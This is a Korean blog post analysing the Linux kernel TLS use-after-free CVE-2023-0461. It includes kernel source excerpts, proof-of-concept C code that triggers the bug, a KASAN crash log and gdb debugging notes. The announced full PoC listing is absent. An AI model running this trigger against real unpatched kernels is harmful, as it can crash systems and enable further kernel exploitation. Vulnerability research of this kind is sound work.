---
comments: false
title: poc
date: 2026-02-28 10:30
categories:
- PoC
- UAF
tags:
- x86-64
- linux-kernel
- cve-2023-0461
---
# PoC: CVE-2023-0461

## CVE Description

리눅스 커널에서 발생한 [CVE-2023-0461](https://nvd.nist.gov/vuln/detail/cve-2023-0461)은 use-after-free 취약점이 존재합니다. 커널을 빌드할 때 `CONFIG_TLS` 또는 `CONFIG_XFRM_ESPINTCP`를 설정해야 하며, `inet_connection_sock` 구조체의 `icsk_ulp_data` 필드에 use-after-free가 있습니다. `CONFIG_TLS`가 활성화된 경우, 사용자는 연결된 TCP 소켓에 TLS 컨텍스트(struct tls_context)를 설치할 수 있습니다. 이 컨텍스트는 소켓 연결이 끊어지고 listener로 재사용되더라도 NULL로 초기화되지 않고 남아있습니다. listener에서 새 소켓이 생성되면 컨텍스트가 상속되어 취약해집니다. 이때 TLS 컨텍스트를 설치하는 setsockopt TCP_ULP 작업은 아무런 권한도 필요로 하지 않습니다.

## Source code auditing

Description을 보면 UAF 취약점이 발생하는 시점은 TLS 컨텍스트를 설치한 소켓을 **disconnect** 하고 다시 **listen** 상태로 설정할 때 `icsk→icsk_ulp_data` 필드가 초기화되지 않아 발생합니다.

disconnect 된 소켓과 다시 listen 된 소켓은 연결이 시작된 이후에는 동일하지 않습니다. 
사용자가 연결이 끊긴 소켓의 fd를 listen() 함수로 전달하여 LISTEN 상태로 전환하고 다시 **connect** 할 때  커널은 SYN 패킷을 처리하는 과정에서 이전에 사용되었던 소켓 데이터를 복제하여 새로운 소켓을 생성하게 됩니다. 

이때 `icsk` 멤버들도 상속되어 동일한 `tls_context` 객체를 가리키는 포인터가 생성됩니다.

그럼 부모 소켓을 close하여 해제할 때 자연스럽게 자식 소켓은 해제된 tls_context 객체에 대한 UAF primitive를 획득하게 됩니다.

다음은 유저 영역에서 connect 된 소켓에 TLS 컨텍스트를 설치하는 예제입니다.

```c
setsockopt(tls, SOL_TCP, TCP_ULP, "tls", sizeof("tls"));
```

다음은 유저 영역에서 할당 받은 소켓을 disconnect 하는 예제입니다.

```c
    addr.sin_family = AF_UNSPEC;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);
    connect(sk, &addr, sizeof(addr));
```

반대로 connect를 할 때는 `addr.sin_family`에 AF_INET를 넘겨주면 됩니다.

### 1. disconnect()

```c
int __inet_stream_connect(struct socket *sock, struct sockaddr *uaddr,
			  int addr_len, int flags, int is_sendmsg)
{
	struct sock *sk = sock->sk;
...
	if (uaddr->sa_family == AF_UNSPEC) {
		err = sk->sk_prot->disconnect(sk, flags);
		sock->state = err ? SS_DISCONNECTING : SS_UNCONNECTED;
		goto out;
	}
}
```

```c
int tcp_disconnect(struct sock *sk, int flags)
{
  struct inet_sock *inet = inet_sk(sk);
  struct inet_connection_sock *icsk = inet_csk(sk);
  struct tcp_sock *tp = tcp_sk(sk);
  int old_state = sk->sk_state;  // (TCP_ESTABLISHED)
  u32 seq;
    
  // TCP_CLOSE
	if (old_state != TCP_CLOSE)
	  tcp_set_state(sk, TCP_CLOSE);
...
	icsk->icsk_backoff = 0;
	icsk->icsk_probes_out = 0;
	icsk->icsk_probes_tstamp = 0;
	icsk->icsk_rto = TCP_TIMEOUT_INIT;
	icsk->icsk_rto_min = TCP_RTO_MIN;
	icsk->icsk_delack_max = TCP_DELACK_MAX;
	tp->snd_ssthresh = TCP_INFINITE_SSTHRESH;
	tcp_snd_cwnd_set(tp, TCP_INIT_CWND);
	tp->snd_cwnd_cnt = 0;
	tp->is_cwnd_limited = 0;
	tp->max_packets_out = 0;
	tp->window_clamp = 0;
	tp->delivered = 0;
	tp->delivered_ce = 0;
	if (icsk->icsk_ca_ops->release)
		icsk->icsk_ca_ops->release(sk);
	memset(icsk->icsk_ca_priv, 0, sizeof(icsk->icsk_ca_priv));
	icsk->icsk_ca_initialized = 0;
	tcp_set_ca_state(sk, TCP_CA_Open);
	tp->is_sack_reneg = 0;
	tcp_clear_retrans(tp);
	tp->total_retrans = 0;
	inet_csk_delack_init(sk);
...
}

static struct tcp_congestion_ops tcp_cdg __read_mostly = {
...
	.release = tcp_cdg_release,
...
};

static void tcp_cdg_release(struct sock *sk)
{
	struct cdg *ca = inet_csk_ca(sk);

	kfree(ca->gradients);
	ca->gradients = NULL;
}
```
커널의 `tcp_disconnect()` 에서 볼 수 있듯 `icsk` 객체를 초기화할 때 `icsk_ulp_data` 필드를 NULL로 변경하지 않습니다. 

참고로, `disconnect()` 에서 복귀한 후에는 `sock→state`가 `SS_UNCONNECTED`로 설정됩니다.

### 2. listen()

```c
int inet_listen(struct socket *sock, int backlog)
{
	struct sock *sk = sock->sk;
	unsigned char old_state;
	int err, tcp_fastopen;

	lock_sock(sk);

	err = -EINVAL;
	// sock->state is SS_UNCONNECTED 
	if (sock->state != SS_UNCONNECTED || sock->type != SOCK_STREAM)
		goto out;

	old_state = sk->sk_state; // TCP_CLOSE
	if (!((1 << old_state) & (TCPF_CLOSE | TCPF_LISTEN)))
		goto out;

	WRITE_ONCE(sk->sk_max_ack_backlog, backlog);

	if (old_state != TCP_LISTEN) {
		tcp_fastopen = READ_ONCE(sock_net(sk)->ipv4.sysctl_tcp_fastopen);
		if ((tcp_fastopen & TFO_SERVER_WO_SOCKOPT1) &&
		    (tcp_fastopen & TFO_SERVER_ENABLE) &&
		    !inet_csk(sk)->icsk_accept_queue.fastopenq.max_qlen) {
			fastopen_queue_tune(sk, backlog);
			tcp_fastopen_init_key_once(sock_net(sk));
		}
		// TCP_CLOSE → TCP_LISTEN
		err = inet_csk_listen_start(sk);
		if (err)
			goto out;
		tcp_call_bpf(sk, BPF_SOCK_OPS_TCP_LISTEN_CB, 0, NULL);
	}
	err = 0;

out:
	release_sock(sk);
	return err;
}

int inet_csk_listen_start(struct sock *sk)
{
	struct inet_connection_sock *icsk = inet_csk(sk);
	struct inet_sock *inet = inet_sk(sk);
	int err = -EADDRINUSE;

	reqsk_queue_alloc(&icsk->icsk_accept_queue);
...
	inet_sk_state_store(sk, TCP_LISTEN);
...
}
```

LISTEN 상태로 소켓을 전환할 때 `inet_csk_listen_start()` 가 
`icsk->icsk_accept_queue`를 초기화하고 소켓을 `TCP_LISTEN`으로 전환합니다.

`icsk_accept_queue`는 클라이언트의 연결 요청이 대기하는 큐이며, 커널은 나중에 `accept()`이 호출될 때 해당 큐에서 FIFO 방식으로 요청 정보를 꺼내어 소켓에 연결합니다.

### 3. tcp_v4_do_rcv()

다음은 커널에서 `connect()`에 의한 SYN 패킷 수신을 처리하는 과정입니다. 

```c
int tcp_v4_do_rcv(struct sock *sk, struct sk_buff *skb)
{
...
	if (sk->sk_state == TCP_LISTEN) {
		struct sock *nsk = tcp_v4_cookie_check(sk, skb);
...
}

static struct sock *tcp_v4_cookie_check(struct sock *sk, struct sk_buff *skb)
{
...
	if (!th->syn)
		sk = cookie_v4_check(sk, skb);
...
}

// cookie_v4_check() -> cookie_v4_check() -> tcp_get_cookie_sock() -> tcp_v4_syn_recv_sock() -> tcp_create_openreq_child() -> inet_csk_clone_lock()

struct sock *inet_csk_clone_lock(const struct sock *sk,
				 const struct request_sock *req,
				 const gfp_t priority)
{
	struct sock *newsk = sk_clone_lock(sk, priority);

	if (newsk) {
		struct inet_connection_sock *newicsk = inet_csk(newsk);

		inet_sk_set_state(newsk, TCP_SYN_RECV);
...
		inet_clone_ulp(req, newsk, priority);
...
	}
	return newsk;
}

struct sock *sk_clone_lock(const struct sock *sk, const gfp_t priority)
{
	struct proto *prot = READ_ONCE(sk->sk_prot);
	struct sk_filter *filter;
	bool is_charged = true;
	struct sock *newsk;

	newsk = sk_prot_alloc(prot, priority, sk->sk_family);
	if (!newsk)
		goto out;

	sock_copy(newsk, sk);
...
}

static struct sock *sk_prot_alloc(struct proto *prot, gfp_t priority,
		int family)
{
	struct sock *sk;
	struct kmem_cache *slab;

	slab = prot->slab;
	if (slab != NULL) {
		sk = kmem_cache_alloc(slab, priority & ~__GFP_ZERO);
...
	} else
		sk = kmalloc(prot->obj_size, priority);
...
}

static void sock_copy(struct sock *nsk, const struct sock *osk)
{
	const struct proto *prot = READ_ONCE(osk->sk_prot);
...
	memcpy(nsk, osk, offsetof(struct sock, sk_dontcopy_begin));
...
}
```

`sk_prot_alloc()`에서 복제본이 저장될 `sock` 객체를 할당하고 `sock_copy()`를 호출해 listener 소켓을 복제합니다. 복제될 때 기존 listener 소켓의 `icsk` 구조체까지 그대로 복제됩니다.

또한, 이후 과정에서 자식 소켓을 `icsk_accept_queue` 연결 리스트에 `req→sk` 필드에 저장합니다.

### 4. accept()

이제 client의 connect 요청(SYN)을 처리하는 작업이 완료되었으니 `accept()`을 사용해 연결 요청을 수락할 차례입니다.

```c
int inet_accept(struct socket *sock, struct socket *newsock, int flags,
		bool kern)
{
	struct sock *sk1 = sock->sk, *sk2;
	int err = -EINVAL;

	sk2 = READ_ONCE(sk1->sk_prot)->accept(sk1, flags, &err, kern);
	if (!sk2)
		goto do_err;
...
	sock_graft(sk2, newsock);

	newsock->state = SS_CONNECTED;
	err = 0;
	release_sock(sk2);
do_err:
	return err;
}

struct proto tcp_prot = {
...
	.accept			= inet_csk_accept,
...
}

struct sock *inet_csk_accept(struct sock *sk, int flags, int *err, bool kern)
{
	struct inet_connection_sock *icsk = inet_csk(sk);
	struct request_sock_queue *queue = &icsk->icsk_accept_queue;
	struct request_sock *req;
	struct sock *newsk;
	int error;
...
	req = reqsk_queue_remove(queue, sk);
	newsk = req->sk;
...
	return newsk;
...
}

static inline void sock_graft(struct sock *sk, struct socket *parent)
{
...
	parent->sk = sk;
	sk_set_socket(sk, parent);
...
}

static inline void sk_set_socket(struct sock *sk, struct socket *sock)
{
	sk->sk_socket = sock;
}
```

`inet_csk_accept()`에서 `reqsk_queue_remove()` 호출로 `req->sk` 필드에 저장된 자식 소켓을 획득하고 `sock_graft()`에서 다음과./ 같은 이중 연결 리스트를 구성합니다.

![sock_graft](assets/images/sock_graft.png)
_[linux tls structure](https://u1f383.github.io/slides/study_groups/Deephacking-20250119.pdf)_

### 5. close()

마지막으로 소켓을 close 할 때 TLS 컨텍스트가 어떻게 해제되는지 살펴봅시다.

```c
static int sock_close(struct inode *inode, struct file *filp)
{
	__sock_release(SOCKET_I(inode), inode);
	return 0;
}

// __sock_release() -> inet_release()

int inet_release(struct socket *sock)
{
	struct sock *sk = sock->sk;
...
		sk->sk_prot->close(sk, timeout);
		sock->sk = NULL;
	}
	return 0;
}

static void build_protos(struct proto prot[TLS_NUM_CONFIG][TLS_NUM_CONFIG],
			 const struct proto *base)
{
...
	prot[TLS_BASE][TLS_BASE].close		= tls_sk_proto_close;
...
}

static void tls_sk_proto_close(struct sock *sk, long timeout)
{
	struct inet_connection_sock *icsk = inet_csk(sk);
	struct tls_context *ctx = tls_get_ctx(sk);
	long timeo = sock_sndtimeo(sk, 0);
	bool free_ctx;
...
	if (ctx->tx_conf == TLS_SW)
		tls_sw_free_ctx_tx(ctx);
	if (ctx->rx_conf == TLS_SW || ctx->rx_conf == TLS_HW)
		tls_sw_strparser_done(ctx);
	if (ctx->rx_conf == TLS_SW)
		tls_sw_free_ctx_rx(ctx);
	ctx->sk_proto->close(sk, timeout);

	if (free_ctx)
		tls_ctx_free(sk, ctx);
}

void tls_ctx_free(struct sock *sk, struct tls_context *ctx)
{
	if (!ctx)
		return;
...
	if (sk)
		kfree_rcu(ctx, rcu);
	else
		kfree(ctx);
}
```

소켓을 close 하는 과정에서 TLS 컨텍스트는 해제되지만 `icsk→icsk_ulp_data`의 포인터는 NULL이 되지 않는 것을 다시 확인할 수 있습니다. 

이때 `tls_context` 객체를 해제할 때 `kfree_rcu()` 매크로를 사용하게 되는데, 해당 매크로는 `kvfree_call_rcu()`를 호출합니다. 

```c
void kvfree_call_rcu(struct rcu_head *head, rcu_callback_t func)
{
	unsigned long flags;
	struct kfree_rcu_cpu *krcp;
	bool success;
	void *ptr;

	if (head) {
		ptr = (void *) head - (unsigned long) func;
	} else {
...
	}
...
	success = add_ptr_to_bulk_krc_lock(&krcp, &flags, ptr, !head);
...
	WRITE_ONCE(krcp->count, krcp->count + 1);

	// Set timer to drain after KFREE_DRAIN_JIFFIES == jiffies(5 * HZ(1000))
	if (rcu_scheduler_active == RCU_SCHEDULER_RUNNING)
		schedule_delayed_monitor_work(krcp);
...
}

static inline bool
add_ptr_to_bulk_krc_lock(struct kfree_rcu_cpu **krcp,
	unsigned long *flags, void *ptr, bool can_alloc)
{
	struct kvfree_rcu_bulk_data *bnode;
	int idx;

	*krcp = krc_this_cpu_lock(flags);
	if (unlikely(!(*krcp)->initialized))
		return false;

	idx = !!is_vmalloc_addr(ptr);
...
	/* Finally insert. */
	(*krcp)->bkvhead[idx]->records
		[(*krcp)->bkvhead[idx]->nr_records++] = ptr;

	return true;
}
```

`kvfree_call_rcu()`에서 볼 수 있듯이 해제 요청을 받은 `tls_context` 객체를 즉시 해제하지 않고 RCU grace period  이후에 해제될 수 있도록 worker를 예약합니다.

커널은 다른 CPU에서 동시에 접근할 수 있는 데이터에 대한 reader가 완료됨을 보장할 수 있도록 유예 기간을 주는데, 이를 Read-Copy-Update(RCU) grace period라고 합니다. 

`tls_context`는 패킷 수신, 네트워크 진단, work queue에 대기 중인 TX 작업 등 다양한 곳에서 read 될 수 있기 때문에 `KFREE_DRAIN_JIFFIES` 로 설정된 시간 동안 reader를 위해 대기한 이후 `records[]`에서 객체들을 모두 해제하게 됩니다.

`KFREE_DRAIN_JIFFIES`로 설정된 값은 일반적으로 5초입니다. 따라서 UAF를 트리거하기 위해 `close()` 이후 `sleep(6);`를 사용하면 `tls_context` 객체를 해제한 뒤 다음 작업을 할 수 있습니다.

## PoC

`CONFIG_KASAN`이 활성화된 커널에서 의도한 BUG를 유발하는 PoC 코드를 간단하게 작성해봅시다.

로컬에서 서버와 클라이언트 역할을 수행할 두 개의 소켓을 준비하고, 소켓에 TLS를 설치하는 코드를 먼저 구현해봅시다.

```c
int malloc_tls(int port) 
{
    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);
    int server, client;

    client = socket(AF_INET, SOCK_STREAM, 0); 
    server = socket(AF_INET, SOCK_STREAM, 0); 

    addr.sin_family = AF_INET;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);

    bind(server, &addr, sizeof(addr));
    listen(server, 0);

    connect(client, &addr, sizeof(addr));

    accept(server, &addr, &len);

    // Install TLS context
    setsockopt(client, SOL_TCP, TCP_ULP, "tls", sizeof("tls"));

    return client;
}
```

다음은 연결된 소켓을 disconnect하고 listener로 전환한 뒤 다시 connect 하는 과정입니다.

```c
int copy_tls(int sk, int port) 
{
    struct sockaddr_in addr;
    socklen_t len = sizeof(addr);
    int client, server;

    client = socket(AF_INET, SOCK_STREAM, 0);

    // Disconnect the 'sk'
    addr.sin_family = AF_UNSPEC;
    addr.sin_addr.s_addr = INADDR_ANY;
    addr.sin_port = htons(port);
    connect(sk, &addr, sizeof(addr));

    // Reuse the 'sk' as listener
    addr.sin_family = AF_INET;
    bind(sk, &addr, sizeof(addr));
    listen(sk, 0);

    connect(client, &addr, sizeof(addr)); // Copy the 'icsk_ulp_data (tls_context)'

    server = accept(sk, &addr, &len);

    peer = client;
    // 'sk'->icsk_ulp_data == 'server'->icsk_ulp_data
    return server;
}
```

connect 과정에서 SYN 패킷을 커널이 수신하고 이전의 소켓 데이터가 복제되어 자식 소켓에게 `tls_context`가 상속되었습니다. 

다음은 부모 소켓을 `close()`를 사용해 해제하여 자식 소켓에서 UAF primitive를 획득하는 과정입니다.

```c
void main()
{
    tls_p = malloc_tls(1234);
    tls_c = copy_tls(tls_p, 5678);

    // Call the 'kvfree_call_rcu()' function
    close(tls_p);

    // Wait for RCU grace period.
    // After KFREE_DRAIN_JIFFIES (5 * HZ(1000))
    // all objects in 'records[]' are freed
    sleep(6);
    
    // tls_context is freed again (KASAN: double-free)
    close(tls_c);
}
```

앞서 설명했던 RCU grace period로 설정된 5초 이상을 `sleep()`으로 대기하여 `kvfree_call_rcu()`으로 지연된 `tls_context` 객체의 해제 작업이 완료될 수 있도록 합니다.

그 다음에 자식 소켓을 `close()`하면 해제된 `tls_context`가 다시 해제되면서 KASAN이 double-free 버그를 출력하게 됩니다.

하지만 우리는 UAF 버그를 재현해내는 것이 목표였기 때문에 조금 더 생각을 해야 합니다.

KASAN은 커널이 어떤 메모리를 참조하기 전에 먼저 접근하여 해당 메모리가 취약하지 않은지 검사하고 해제된 객체일 경우 use-after-free, 또는 double-free 버그를 출력합니다.

따라서 유저 영역에서 해제된 `tls_context` 객체에 접근할 수 있는 코드를 실행하면 어디에선가 UAF 버그가 발생할 것입니다.

[리눅스 커널 문서](https://www.kernel.org/doc/html/v6.1/networking/tls.html)에서는 `tls12_crypto_info_aes_gcm_128` 구조체를 설정한 다음 `setsockopt()`의 옵션으로 `TLS_TX`, `TLS_RX`를 전달합니다.

소켓 옵션이 적용되면 해당 소켓을 통해 송수신되는 모든 데이터는 TLS와 소켓 옵션에 제공된 매개변수를 사용하여 암호화됩니다. 

즉, 커널이 송수신을 처리하는 과정에서 `tls_context` 객체에 접근한다는 의미입니다.

문서의 예제 코드를 참고하여 작성한 전체 PoC 코드는 다음과 같습니다.

모든 준비가 끝났습니다. 이제 커널에서 poc를 실행할 차례입니다.

### KASAN LOG

```shell
~ # ./poc
[   14.014920] ==================================================================
[   14.016373] BUG: KASAN: use-after-free in mutex_lock+0x7a/0xe0
[   14.017381] Write of size 8 at addr ffff888103d94070 by task poc/88
[   14.018299] 
[   14.018508] CPU: 0 PID: 88 Comm: poc Not tainted 6.1.0 #1
[   14.019272] Hardware name: QEMU Standard PC (i440FX + PIIX, 1996), BIOS 1.15.0-1 04/01/2014
[   14.020549] Call Trace:
[   14.020900]  <TASK>
[   14.021232]  dump_stack_lvl+0x34/0x48
[   14.021919]  print_report+0x172/0x475
[   14.022568]  ? __virt_addr_valid+0xef/0x170
[   14.023284]  ? mutex_lock+0x7a/0xe0
[   14.023851]  kasan_report+0xad/0x130
[   14.024489]  ? mutex_lock+0x7a/0xe0
[   14.025138]  kasan_check_range+0x35/0x1c0
[   14.025836]  mutex_lock+0x7a/0xe0
[   14.026433]  ? __mutex_lock_slowpath+0x10/0x10
[   14.027177]  ? __mutex_lock_slowpath+0x10/0x10
[   14.027950]  tls_sw_sendmsg+0xa5/0x770 [tls]
[   14.028670]  ? inet_send_prepare+0x110/0x110
[   14.029430]  ? selinux_socket_sendmsg+0xae/0x180
[   14.030290]  ? tx_work_handler+0x70/0x70 [tls]
[   14.031012]  ? inet_sendmsg+0x3e/0x90
[   14.031637]  ? inet_send_prepare+0x110/0x110
[   14.032402]  sock_sendmsg+0x8e/0xa0
[   14.033049]  __sys_sendto+0x189/0x230
[   14.033670]  ? __ia32_sys_getpeername+0x50/0x50
[   14.034436]  ? hrtimer_nanosleep+0x137/0x2d0
[   14.035157]  ? memset+0x20/0x50
[   14.035698]  ? tls_getsockopt+0x86/0x310 [tls]
[   14.036482]  ? sock_common_getsockopt+0x3c/0x60
[   14.037301]  ? __sys_getsockopt+0xeb/0x190
[   14.038032]  ? __ia32_sys_setsockopt+0x70/0x70
[   14.038860]  ? kernel_fpu_begin_mask+0x160/0x160
[   14.039696]  ? __x64_sys_clock_nanosleep+0x189/0x210
[   14.040572]  __x64_sys_sendto+0x6d/0x80
[   14.041235]  do_syscall_64+0x3b/0x90
[   14.041853]  entry_SYSCALL_64_after_hwframe+0x63/0xcd
[   14.042732] RIP: 0033:0x4522f0
[   14.043281] Code: c0 ff ff ff ff eb b9 0f 1f 00 f3 0f 1e fa 41 89 ca 64 8b 04 25 18 00 00 00 85 c0 75 1d 45 31 c9 45 31 c0 b8 2c 00 00 00 0f 05 <48> 3d 00 f0 ff f0
[   14.046587] RSP: 002b:00007ffcc8cb5398 EFLAGS: 00000246 ORIG_RAX: 000000000000002c
[   14.047929] RAX: ffffffffffffffda RBX: 00007ffcc8cb5608 RCX: 00000000004522f0
[   14.049069] RDX: 0000000000000005 RSI: 000000000049901d RDI: 0000000000000007
[   14.050307] RBP: 00007ffcc8cb5410 R08: 0000000000000000 R09: 0000000000000000
[   14.051529] R10: 0000000000000000 R11: 0000000000000246 R12: 0000000000000001
[   14.052689] R13: 00007ffcc8cb55f8 R14: 00000000004c27d0 R15: 0000000000000001
[   14.053876]  </TASK>
[   14.054293] 
[   14.054570] Allocated by task 88:
[   14.055231] 
[   14.055535] Freed by task 19:
[   14.056105] 
[   14.056373] Last potentially related work creation:
[   14.057246] 
[   14.057540] The buggy address belongs to the object at ffff888103d94000
[   14.057540]  which belongs to the cache kmalloc-512 of size 512
[   14.059757] The buggy address is located 112 bytes inside of
[   14.059757]  512-byte region [ffff888103d94000, ffff888103d94200)
[   14.061718] 
[   14.062008] The buggy address belongs to the physical page:
[   14.062989] 
[   14.063269] Memory state around the buggy address:
[   14.063980]  ffff888103d93f00: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[   14.065206]  ffff888103d93f80: 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00
[   14.066362] >ffff888103d94000: fa fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   14.067671]                                                              ^
[   14.068886]  ffff888103d94080: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   14.070025]  ffff888103d94100: fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb fb
[   14.071276] ==================================================================
```

예상했던 대로 `send()`를 처리하는 과정에서 UAF 버그가 발생했습니다. 하지만 로그 정보만으로는 의도했던 부분에서 버그가 발생했는지 확신하기 어렵습니다. 

gdb를 사용하여 동적 분석을 하기 전에 소스코드를 먼저 확인하여 흐름을 파악해두는 것이 좋습니다.

```c
int sock_sendmsg(struct socket *sock, struct msghdr *msg)
{
	int err = security_socket_sendmsg(sock, msg,
					  msg_data_left(msg));

	return err ?: sock_sendmsg_nosec(sock, msg);
}

static inline int sock_sendmsg_nosec(struct socket *sock, struct msghdr *msg)
{
	int ret = INDIRECT_CALL_INET(sock->ops->sendmsg, inet6_sendmsg,
				     inet_sendmsg, sock, msg,
				     msg_data_left(msg));
	BUG_ON(ret == -EIOCBQUEUED);
	return ret;
}

int inet_sendmsg(struct socket *sock, struct msghdr *msg, size_t size)
{
	struct sock *sk = sock->sk;

	if (unlikely(inet_send_prepare(sk)))
		return -EAGAIN;

	return INDIRECT_CALL_2(sk->sk_prot->sendmsg, tcp_sendmsg, udp_sendmsg,
			       sk, msg, size);
}

#define INDIRECT_CALL_1(f, f1, ...)					\
	({								\
		likely(f == f1) ? f1(__VA_ARGS__) : f(__VA_ARGS__);	\
	})
#define INDIRECT_CALL_2(f, f2, f1, ...)					\
	({								\
		likely(f == f2) ? f2(__VA_ARGS__) :			\
				  INDIRECT_CALL_1(f, f1, __VA_ARGS__);	\
	})
```

`inet_sendmsg()`에서 `INDIRECT_CALL_2()` 매크로를 사용하여 `sk->sk_prot->sendmsg()` 함수 포인터와 두 함수 주소를 비교하고 동일한 주소로 점프하거나, 둘 다 같지 않으면 함수 포인터로 점프를 합니다.

이때 TLS가 적용된 소켓은 kTLS 모듈에 존재하는 전용 함수가 있기 때문에 `sendmsg()` 함수 포인터로 점프하여 `tls_sw_sendmsg()`를 호출하게 됩니다. 그리고 KASAN 로그에서 이 함수에서 호출되는 `mutex_lock()`에 원인이 존재함을 알 수 있습니다.

```c
int tls_sw_sendmsg(struct sock *sk, struct msghdr *msg, size_t size)
{
	long timeo = sock_sndtimeo(sk, msg->msg_flags & MSG_DONTWAIT);
	struct tls_context *tls_ctx = tls_get_ctx(sk);
	struct tls_prot_info *prot = &tls_ctx->prot_info;
	struct tls_sw_context_tx *ctx = tls_sw_ctx_tx(tls_ctx);
...
	mutex_lock(&tls_ctx->tx_lock);
...
}

static inline struct tls_context *tls_get_ctx(const struct sock *sk)
{
	struct inet_connection_sock *icsk = inet_csk(sk);
	return (__force void *)icsk->icsk_ulp_data;
}
```

정확합니다. `mutex_lock()`은 해제된 `tls_context`를 참조에 사용하고 있습니다. 

참고로 `tls_get_ctx()`에서 버그가 발생하지 않은 이유는 in-use 상태인 자식 소켓을 참조에 사용했기 때문입니다.

## Debugging

KASAN 로그는 추적된 함수들의 옆에 offset 정보가 존재합니다. 이 정보를 바탕으로 함수의 진입점을 쉽게 찾을 수 있습니다. 그러나 RIP 기준 offset이므로 실제 진입점은 바로 이전의 명령어에 해당합니다.

**sock_sendmsg+0x8e**

![image.png](image%201.png)

```shell
In file: /home/kimq/SUB/kctf/CVE/2023/0461/linux-6.1/net/socket.c:717
   712 static inline int sock_sendmsg_nosec(struct socket *sock, struct msghdr *msg)
   713 {
   714         int ret = INDIRECT_CALL_INET(sock->ops->sendmsg, inet6_sendmsg,
   715                                      inet_sendmsg, sock, msg,
   716                                      msg_data_left(msg));
 ► 717         BUG_ON(ret == -EIOCBQUEUED);
```

`inet_sendmsg()`의 진입점입니다. 

**inet_sendmsg+0x3e**

![image.png](image%202.png)

```shell
In file: /home/kimq/SUB/kctf/CVE/2023/0461/linux-6.1/net/ipv4/af_inet.c:827
   822         struct sock *sk = sock->sk;
   823 
   824         if (unlikely(inet_send_prepare(sk)))
   825                 return -EAGAIN;
   826 
 ► 827         return INDIRECT_CALL_2(sk->sk_prot->sendmsg, tcp_sendmsg, udp_sendmsg,
   828                                sk, msg, size);
   829 }
```

`inet_sendmsg+0x3e`에는 `sk->sk_prot->sendmsg()` 함수 포인터를 `$RAX`에 저장하는 코드가 있습니다. 

그리고 이 시점에서 `$RDI`에는 `inet_send_prepare()`가 호출될 때 인자로 전달했던 자식 소켓 주소가 아직 남아있습니다. 

pwndbg의 내장 툴을 활용해 `icsk_ulp_data`의 값과 객체의 할당 상태를 확인할 수 있습니다.

```c
pwndbg> slab contains 0xffff888103ef2500
0xffff888103ef2500 @ TCP
slab: 0xffff888103ef0000 [active, cpu 0]
status: in-use

pwndbg> p/x *(struct inet_connection_sock *)0xffff888103ef2500
$2 = {
...
  icsk_ca_ops = 0xffffffff83b97500,
  icsk_af_ops = 0xffffffff82e683c0,
  icsk_ulp_ops = 0xffffffffc000ee40,
  icsk_ulp_data = 0xffff888103d94000,
...
}
```

**tls_sw_sendmsg+0xa5**

![image.png](image%203.png)

```c
In file: /home/kimq/SUB/kctf/CVE/2023/0461/linux-6.1/net/tls/tls_sw.c:942
   938         if (msg->msg_flags & ~(MSG_MORE | MSG_DONTWAIT | MSG_NOSIGNAL |
   939         		                    MSG_CMSG_COMPAT))
   940                 return -EOPNOTSUPP;
   941 
 ► 942         mutex_lock(&tls_ctx->tx_lock);
   943         lock_sock(sk);
   944 
```

`mutex_lock()`에 전달되는 값은 `tls_ctx→tx_lock` 포인터이므로 offset이 0x70임을 알 수 있습니다.

```c
pwndbg> slab contains 0xffff888103d94000
0xffff888103d94000 @ kmalloc-512
Did not find containing slab.

pwndbg> x/2gx 0xffff888103d94000+0x70
0xffff888103d94070:     0xffff888103e7ae00      0x0000000000000000

pwndbg> p/x *(struct tls_context *)0xffff888103d94000
$3 = {
...
  tx_lock = {
    owner = {
      counter = 0xffff888103e7ae00
    },
...
}
```

이후 실행에서 앞서 보았던 KASAN: use-after-free 버그가 발생하는 것을 확인할 수 있습니다.

여기서 주목해야 하는 부분은 `tls_context`가 kmalloc-512 cache에서 할당되었다는 것입니다. 

향후 익스플로잇을 개발할 때 UAF primitive를 활용하기 위해서 동일한 캐시를 사용하는 악용 가능한 객체를 식별해야 하기 때문입니다.

## 마치며

해당 포스트는 리눅스 커널 6.1.0 버전에 존재하는 CVE-2023-0461(UAF) 취약점이 어떻게 동작하는지 간단하게 살펴보고, PoC 코드를 만들어 KASAN log를 출력하는 과정까지 설명했습니다. 

해당 취약점은 double-free를 사용해서 UAF 객체를 만들기 쉽고, `CONFIG_SLAB_VIRTUAL`이나 `CONFIG_KMALLOC_SPLIT_VARSIZE` 같은 실험적 완화 조치가 적용되지 않은 환경이라면 cross-cache attack과 같은 여러 공격 기법들을 공부하기 좋은 조건이라고 생각합니다.

다음 블로그 게시물에서 익스플로잇을 개발하는 과정을 담아내도록 하겠습니다.
